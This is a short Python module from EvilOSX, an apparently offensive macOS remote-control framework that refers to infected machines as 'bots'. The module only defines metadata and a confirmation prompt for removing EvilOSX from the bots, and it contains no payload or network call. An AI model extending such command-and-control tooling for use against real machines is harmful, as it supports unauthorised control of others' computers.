# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Remove EvilOSX from the bot.",
            "References": [],
            "Stoppable": False
        }

    def setup(self, view) -> Tuple[bool, Optional[dict]]:
        confirm = view.prompt("Are you sure you want to continue [y/N]: ", (
            "You are about to remove EvilOSX from the bot(s).", "attention"
        )).lower()

        if not confirm or confirm == "n":
            return False, None
        else:
            return True, None
